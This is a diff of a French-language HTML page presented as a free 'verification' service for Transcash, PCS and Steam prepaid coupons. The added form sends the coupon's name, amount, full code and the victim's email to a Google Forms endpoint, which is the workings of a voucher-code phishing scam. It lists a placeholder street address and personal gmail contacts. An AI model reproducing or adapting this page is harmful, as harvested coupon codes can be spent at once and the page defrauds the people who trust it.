@@ -1,96 +1,91 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification Recharge</title>
+    <title>Vérification de Recharges</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 20px;
-            background-color: #f4f4f4;
-        }
-        .menu {
-            display: flex;
-            gap: 10px;
-        }
-        .menu a {
-            text-decoration: none;
-            padding: 10px 15px;
-            background-color: #333;
-            color: white;
-            border-radius: 5px;
         }
         .container {
-            max-width: 800px;
-            margin: 20px auto;
+            width: 80%;
+            margin: 0 auto;
             padding: 20px;
-            border: 1px solid #ddd;
         }
-        h2 {
-            margin-top: 0;
+        .header {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
         }
-        iframe {
+        .header h1 {
+            margin: 0;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-group input[type="text"], .form-group input[type="email"] {
             width: 100%;
-            border: none;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        .form-group input[type="radio"] {
+            margin-right: 10px;
+        }
+        .footer {
+            background-color: #f8f8f8;
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #ddd;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Vérification Recharge</h1>
-        <nav class="menu">
-            <a href="#accueil">Accueil</a>
-            <a href="#verification">Vérification</a>
-            <a href="#contact">Contact</a>
-        </nav>
-    </header>
-    <div id="accueil" class="container">
-        <h2>Accueil</h2>
-        <p>Vérifiez vos recharge/carte en toute sécurité.</p>
-        <h3>Comment Faire Une Vérification de Ticket Transcash?</h3>
-        <p>Vérifier un recharge ou carte/Réponse instantanée.</p>
-        <h3>Transcash</h3>
-        <p>Notre système de vérification vous permet de vérifier votre ticket/coupon transcash sans posséder une carte transcash et ce gratuitement, en toute sécurité et de façon illimitée 24h/7. Cette méthode consiste à remplir un formulaire.</p>
-        <h3>PCS</h3>
-        <p>Notre système de vérification vous permet de vérifier votre ticket/coupon PCS sans posséder une carte PCS et ce gratuitement, en toute sécurité et de façon illimitée 24h/7. Cette méthode consiste à remplir un formulaire.</p>
-        <h3>Steam</h3>
-        <p>Notre système de vérification vous permet de vérifier votre ticket/coupon Steam sans posséder une carte Steam et ce gratuitement, en toute sécurité et de façon illimitée 24h/7. Cette méthode consiste à remplir un formulaire.</p>
-        <h3>Horaires D'OUVERTURE</h3>
-        <p>Lu-Ve 07j/24H</p>
-        <p>Sa-Di 8h/13H</p>
-        <h3>NOUS TROUVER</h3>
-        <p>123 Rue du test<br>Paris, 75001<br>Email: ladirectiontranscashpcs@gmail.com</p>
-        <h3>NOUS SUIVRE</h3>
-        <p>Mentions légales | Politique de confidentialité | Politique des cookies | Plan du site</p>
+    <div class="header">
+        <h1>Vérifie ton recharge</h1>
     </div>
-    <div id="verification" class="container">
-        <h2>Vérification du ticket</h2>
-        <iframe src="https://docs.google.com/forms/d/e/1FAIpQLScNY7gd1wgbS9Uc94dSBeJq1VwA0brIQVJxJDoL91LtpKZ7NA/viewform?usp=pp_url&entry.2033746373=Option+1&entry.1646349537=Code+exact&entry.1828072517=Code+correct+" width="640" height="800" frameborder="0" marginheight="0" marginwidth="0">Chargement…</iframe>
-        <h3>Horaires D'OUVERTURE</h3>
-        <p>Lu-Ve 07j/24H</p>
-        <p>Sa-Di 8h/13H</p>
-        <h3>NOUS TROUVER</h3>
-        <p>123 Rue du test<br>Paris, 75001<br>Email: ladirectiontranscashpcs@gmail.com</p>
-        <h3>NOUS SUIVRE</h3>
-    </div>
-    <div id="contact" class="container">
-        <h2>Contact Clientèle</h2>
-        <p>Pour nous contacter, envoyez un email à : ladirectiontranscashpcs@gmail.com</p>
-        <h3>Horaires D'OUVERTURE</h3>
-        <p>Lu-Ve 07j/24H</p>
-        <p>Sa-Di 8h/13H</p>
-        <h3>NOUS TROUVER</h3>
-        <p>123 Rue du test<br>Paris, 75001<br>Email: ladirectiontranscashpcs@gmail.com</p>
-        <h3>NOUS SUIVRE</h3>
+    <div class="container">
+        <form action="https://docs.google.com/forms/d/e/1FAIpQLScNY7gd1wgbS9Uc94dSBeJq1VwA0brIQVJxJDoL91LtpKZ7NA/formResponse" method="POST">
+            <div class="form-group">
+                <label for="nom-recharge">Nom du recharge</label>
+                <input type="text" name="entry.2033746373" id="nom-recharge">
+            </div>
+            <div class="form-group">
+                <label for="montant">Montant</label>
+                <input type="text" name="entry.1646349537" id="montant">
+            </div>
+            <div class="form-group">
+                <label for="code-recharge">Code du recharge</label>
+                <input type="text" name="entry.1828072517" id="code-recharge">
+            </div>
+            <div class="form-group">
+                <label>Cachez votre code</label>
+                <input type="radio" name="entry.1234567890" value="Oui"> OUI
+                <input type="radio" name="entry.1234567890" value="Non"> NON
+            </div>
+            <div class="form-group">
+                <label for="email">E-mail</label>
+                <input type="email" name="entry.9876543210" id="email">
+            </div>
+            <p>Notre Politique de confidentialité s'applique.</p>
+            <button type="submit">Vérifiez</button>
+        </form>
+        <div class="footer">
+            <p>Horaires D'OUVERTURE<br>Lu-Ve 07j/24H<br>Sa-Di 8h/13H</p>
+            <p>NOUS TROUVER<br>123 Rue du test<br>Paris, 75001</p>
+            <p>leuriel329@gmail.com</p>
+            <p>NOUS SUIVRE</p>
+            <p>Mentions légales | Politique de confidentialité | Politique des cookies | Plan du site</p>
+            <p>ConnexionJimdoCe site a été conçu avec Jimdo. Inscrivez-vous gratuitement sur <a href="https://fr.jimdo.com">https://fr.jimdo.com</a></p>
+        </div>
     </div>
 </body>
 </html>
